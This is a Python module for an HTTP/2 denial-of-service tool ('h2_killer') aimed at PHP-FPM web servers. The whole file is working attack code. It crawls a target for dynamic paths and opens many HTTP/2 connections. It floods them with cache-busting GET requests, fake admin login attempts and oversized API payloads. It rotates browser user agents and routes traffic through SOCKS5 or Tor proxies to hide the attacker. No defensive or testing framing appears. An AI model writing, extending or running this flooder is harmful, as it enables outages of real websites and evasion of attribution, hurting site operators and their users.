"""
HTTP/2 Exhaust Engine v3 — PHP-FPM Exhauster
=============================================
Key insight: nginx buffers POST bodies, so pending streams only
hold nginx connections (not PHP workers). We send COMPLETE POST
requests (login attempts, API calls) that trigger real PHP+DB
processing and CANNOT be cached.

Hybrid approach: blast streams, then quick-drain to free slots,
reconnect only when connection genuinely dies.
"""
from __future__ import annotations

import logging
import random
import socket
import ssl
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

import h2.config
import h2.connection
import h2.events
import h2.exceptions as h2e
import h2.settings

logger = logging.getLogger("h2_killer")

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
]

FALLBACK_GET_PATHS = [
    "/index.php/index/login",
    "/index.php/search",
    "/index.php/management/importexport",
    "/index.php/management/settings",
    "/index.php/management/users",
    "/index.php/management/submissions",
    "/index.php/stats/index",
    "/index.php/stats/editorial",
    "/api/v1/submissions",
    "/api/v1/users",
    "/api/v1/contexts",
    "/api/v1/stats/publications",
]

CMS_GET_PATHS = {
    "wordpress": ["/wp-login.php", "/wp-admin/admin-ajax.php", "/xmlrpc.php", "/wp-cron.php", "/wp-json/wp/v2/posts"],
    "joomla": ["/index.php?option=com_users", "/index.php?option=com_content", "/index.php?option=com_search"],
    "drupal": ["/user/login", "/node/add", "/admin/reports/status"],
    "laravel": ["/login", "/register", "/api/user", "/_debugbar/open"],
    "generic": ["/search", "/login", "/register", "/contact", "/api", "/admin"],
}

def discover_paths(target_url: str, host_header: str = "") -> List[str]:
    """
    Fetch the target homepage and extract all internal paths.
    Falls back to CMS-specific paths based on response headers.
    """
    import re
    try:
        import requests as _req
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
            "Accept": "text/html,*/*",
            "Accept-Language": "en-US,en;q=0.5",
        }
        if host_header:
            headers["Host"] = host_header
        r = _req.get(target_url, headers=headers, timeout=8, verify=False, allow_redirects=True)
        html = r.text

        # Extract all paths from href/src
        all_paths = set()
        # href patterns
        for match in re.finditer(r'(?:href|src|action)=["\']([^"\']+)["\']', html, re.IGNORECASE):
            url = match.group(1)
            if url.startswith("http"):
                continue
            if url.startswith("//"):
                continue
            if url.startswith("#"):
                continue
            if url.startswith("data:"):
                continue
            if url.startswith("tel:"):
                continue
            if url.startswith("mailto:"):
                continue
            if not url.startswith("/"):
                url = "/" + url
            # Remove fragments
            if "#" in url:
                url = url[:url.index("#")]
            all_paths.add(url)

        # Detect CMS from response headers
        server = r.headers.get("X-Generator", "") or r.headers.get("X-Powered-By", "") or ""
        server_lower = server.lower()
        detected_cms = ""
        for cms_name in CMS_GET_PATHS:
            if cms_name in server_lower:
                detected_cms = cms_name
                break

        if detected_cms:
            for p in CMS_GET_PATHS[detected_cms]:
                all_paths.add(p)

        # Always add generic paths
        for p in CMS_GET_PATHS["generic"]:
            all_paths.add(p)

        # Filter: only PHP paths or paths with extensions
        filtered = [p for p in all_paths if ".php" in p or ".asp" in p or ".aspx" in p or "/api/" in p.lower() or "/admin" in p.lower() or "/login" in p.lower()]
        if not filtered:
            filtered = [p for p in all_paths if not any(p.endswith(ext) for ext in [".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".ico", ".svg", ".woff", ".woff2", ".ttf", ".eot"])]

        if filtered:
            logger.info(f"Discovered {len(filtered)} dynamic paths from {target_url}")
            return sorted(filtered)[:50]
    except Exception:
        pass

    # Fallback to CMS detection from URL
    parsed = urlparse(target_url)
    host = parsed.hostname or ""
    for cms_name, paths in CMS_GET_PATHS.items():
        for p in paths:
            if p in host.lower():
                logger.info(f"Using {cms_name}-specific paths")
                return paths + FALLBACK_GET_PATHS

    logger.info("Using fallback generic paths")
    return FALLBACK_GET_PATHS


POST_LOGIN_BODIES = [
    "username=admin&password=wrong{}",
    "username=editor&password=invalid{}",
    "username=author&password=fail{}",
    "username=reviewer&password=nope{}",
    "csrf_token=fake{}&email=admin@test.com&password=guess",
]

POST_API_BODIES = [
    '{"title":"test","abstract":"x"*9999}',
    '{"search":"a"*5000,"filters":{}}',
    '{"command":"import","data":"x"*99999}',
]


@dataclass
class FloodMetrics:
    sent: int = 0
    completed: int = 0
    failed: int = 0
    bytes_sent: int = 0
    started_at: float = field(default_factory=time.time)

    def actual_rps(self) -> float:
        return self.sent / max(1e-6, time.time() - self.started_at)


class H2Blaster:
    """Single h2 connection with blast + drain cycle for max throughput.
    Supports optional SOCKS5 proxy for IP anonymity (Tor, SOCKS5 proxies).
    """
    __slots__ = ("host", "port", "host_header", "conn", "ssl_sock",
                 "alive", "next_id", "proxy_url")

    def __init__(self, host: str, port: int, host_header: str = "", proxy_url: str = ""):
        self.host = host
        self.port = port
        self.host_header = host_header or host
        self.conn: Any = None
        self.ssl_sock: Optional[ssl.SSLSocket] = None
        self.alive = False
        self.next_id = 1
        self.proxy_url = proxy_url

    def _make_socket(self, timeout: float):
        """Create TCP socket, optionally through SOCKS5 proxy (no DNS leak)."""
        from core.network.socks_utils import create_proxied_socket
        return create_proxied_socket(self.proxy_url, timeout)

    def open(self, timeout: float = 6.0) -> bool:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            ctx.set_ciphers("HIGH:!aNULL:!MD5")

            sock = self._make_socket(timeout)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((self.host, self.port))

            ssl_sock = ctx.wrap_socket(sock, server_hostname=self.host_header)
            if ssl_sock.selected_alpn_protocol() != "h2":
                ssl_sock.close()
                return False

            config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            ssl_sock.sendall(conn.data_to_send())

            data = ssl_sock.recv(65535)
            if data:
                events = conn.receive_data(data)
                ssl_sock.sendall(conn.data_to_send())

            self.conn = conn
            self.ssl_sock = ssl_sock
            self.alive = True
            self.next_id = 1
            return True
        except Exception:
            return False

    def available_slots(self) -> int:
        """Return free stream slots on this connection."""
        if not self.alive or not self.conn:
            return 0
        max_s = getattr(self.conn, 'max_outbound_streams', 128)
        open_s = getattr(self.conn, 'open_outbound_streams', 0)
        return max(0, max_s - open_s)

    def blast_gets(self, count: int, paths: List[str]) -> int:
        """Send up to N GET requests. Returns count actually sent."""
        if not self.alive:
            return 0
        actual = 0
        try:
            for _ in range(count):
                sid = self.next_id
                self.next_id += 2
                path = random.choice(paths) + f"?_{random.randint(0,99999999)}"
                self.conn.send_headers(sid, [
                    (":method", "GET"),
                    (":path", path),
                    (":authority", self.host_header),
                    (":scheme", "https"),
                    ("user-agent", random.choice(UA_POOL)),
                    ("accept", "*/*"),
                    ("cache-control", "no-cache, no-store, must-revalidate"),
                    ("pragma", "no-cache"),
                ], end_stream=True)
                actual += 1
        except Exception:
            self.alive = False
        return actual

    def blast_posts(self, count: int) -> int:
        """Send N complete POST login attempts. Returns count."""
        if not self.alive:
            return 0
        actual = 0
        try:
            for _ in range(count):
                sid = self.next_id
                self.next_id += 2
                body = random.choice(POST_LOGIN_BODIES).format(
                    random.randint(0, 99999)).encode()
                path = random.choice([
                    "/index.php/login",
                    "/index.php/index/login",
                    "/index.php/search",
                ])
                self.conn.send_headers(sid, [
                    (":method", "POST"),
                    (":path", path),
                    (":authority", self.host_header),
                    (":scheme", "https"),
                    ("content-length", str(len(body))),
                    ("content-type", "application/x-www-form-urlencoded"),
                    ("user-agent", random.choice(UA_POOL)),
                    ("accept", "*/*"),
                    ("cache-control", "no-cache"),
                ], end_stream=False)
                self.conn.send_data(sid, body, end_stream=True)
                actual += 1
        except Exception:
            self.alive = False
        return actual

    def blast_api_posts(self, count: int) -> int:
        """Send N JSON POST requests. Returns count."""
        if not self.alive:
            return 0
        actual = 0
        try:
            for _ in range(count):
                sid = self.next_id
                self.next_id += 2
                body = random.choice(POST_API_BODIES).encode()
                path = random.choice([
                    "/api/v1/submissions",
                    "/api/v1/users/search",
                    "/api/v1/stats/publications",
                ])
                self.conn.send_headers(sid, [
                    (":method", "POST"),
                    (":path", path),
                    (":authority", self.host_header),
                    (":scheme", "https"),
                    ("content-length", str(len(body))),
                    ("content-type", "application/json"),
                    ("user-agent", random.choice(UA_POOL)),
                    ("accept", "application/json"),
                    ("cache-control", "no-cache"),
                ], end_stream=False)
                self.conn.send_data(sid, body, end_stream=True)
                actual += 1
        except Exception:
            self.alive = False
        return actual

    def flush(self) -> bool:
        """Send all pending h2 frames to socket."""
        if not self.alive:
            return False
        try:
            data = self.conn.data_to_send()
            if data:
                self.ssl_sock.sendall(data)
            return True
        except (BrokenPipeError, ConnectionResetError, OSError):
            self.alive = False
            return False

    def quick_drain(self) -> int:
        """
        Quick non-blocking drain to free stream slots.
        Returns freed slot count.
        """
        if not self.alive or not self.ssl_sock:
            return 0
        freed = 0
        try:
            self.ssl_sock.settimeout(0)
            while True:
                data = self.ssl_sock.recv(65535)
                if not data:
                    self.alive = False
                    return freed
                events = self.conn.receive_data(data)
                for ev in events:
                    if isinstance(ev, (
                        h2.events.StreamEnded,
                        h2.events.DataReceived,
                        h2.events.ResponseReceived,
                        h2.events.StreamReset,
                    )):
                        freed += 1
                extra = self.conn.data_to_send()
                if extra:
                    try:
                        self.ssl_sock.sendall(extra)
                    except Exception:
                        self.alive = False
                        return freed
        except socket.timeout:
            pass
        except BlockingIOError:
            pass
        except ssl.SSLWantReadError:
            pass
        except (BrokenPipeError, ConnectionResetError, OSError):
            self.alive = False
        except Exception:
            self.alive = False
        return freed

    def flush_and_close(self):
        self.alive = False
        if self.conn:
            try:
                self.conn.close_connection()
                if self.ssl_sock:
                    self.ssl_sock.sendall(self.conn.data_to_send())
            except Exception:
                pass
        if self.ssl_sock:
            try:
                self.ssl_sock.close()
            except Exception:
                pass


def run_h2_exhaust(
    target_url: str, rps: int, duration: float, worker_id: int,
    stats_queue, stop_event, host_header: str = "",
    connections: int = 4, result_dict: dict = None,
    proxy_url: str = "",
) -> None:
    """
    H2 Exhaust v3 — PHP-FPM blaster with optional SOCKS5 proxy support.
    
    When proxy_url is set (e.g. socks5://127.0.0.1:9050), all H2 connections
    are tunneled through the SOCKS5 proxy for IP anonymity.
    
    Cycle: blast → drain → blast → drain (keep connections alive).
    Only reconnect when a connection truly dies.
    """
    parsed = urlparse(target_url)
    host = parsed.hostname or parsed.netloc.split(":")[0]
    port = parsed.port or 443
    hdr = host_header or host

    metrics = FloodMetrics()
    _last_report = time.time()
    _last_sent = 0
    start = time.time()
    metrics.started_at = start

    conn_max = max(2, min(32, connections))
    get_paths = discover_paths(target_url, hdr)
    if not get_paths:
        get_paths = FALLBACK_GET_PATHS

    def push_stats(force=False):
        nonlocal _last_report, _last_sent
        now = time.time()
        if not force and (now - _last_report) < 0.25:
            return
        instant = (metrics.sent - _last_sent) / max(1e-6, now - _last_report)
        snap = {
            "worker_id": worker_id, "ts": now,
            "sent": metrics.sent, "failed": metrics.failed,
            "completed": metrics.completed,
            "bytes_sent": metrics.bytes_sent,
            "instant_rps": instant,
            "avg_rps": metrics.sent / max(1e-6, now - metrics.started_at),
        }
        try:
            stats_queue.put_nowait(snap)
        except Exception:
            try:
                stats_queue.get_nowait()
                stats_queue.put_nowait(snap)
            except Exception:
                pass
        _last_report = now
        _last_sent = metrics.sent

    pool: List[H2Blaster] = []

    try:
        while not stop_event.is_set():
            elapsed = time.time() - start
            if elapsed >= duration:
                break

            # Maintain pool
            pool = [c for c in pool if c.alive]
            while len(pool) < conn_max:
                c = H2Blaster(host, port, hdr, proxy_url)
                if c.open():
                    pool.append(c)
                else:
                    break

            if not pool:
                time.sleep(0.5)
                continue

            # BLAST phase: fill all available slots on each connection
            for conn in pool:
                if not conn.alive:
                    continue
                slots = conn.available_slots()
                if slots <= 0:
                    continue

                # 70% GETs, 20% POST logins, 10% API POSTs
                conn.blast_gets(int(slots * 0.7), get_paths)
                conn.blast_posts(int(slots * 0.2))
                conn.blast_api_posts(int(slots * 0.1))

                metrics.sent += slots
                metrics.completed = metrics.sent
                conn.flush()

            # DRAIN phase: quick non-blocking read to free slots
            for conn in pool:
                if conn.alive:
                    conn.quick_drain()

            push_stats(force=False)
            time.sleep(0.001)

    finally:
        for c in pool:
            try:
                c.flush_and_close()
            except Exception:
                pass
        push_stats(force=True)

    if result_dict is not None:
        result_dict["sent"] = metrics.sent
        result_dict["completed"] = metrics.completed
        result_dict["failed"] = metrics.failed
        result_dict["bytes_sent"] = metrics.bytes_sent
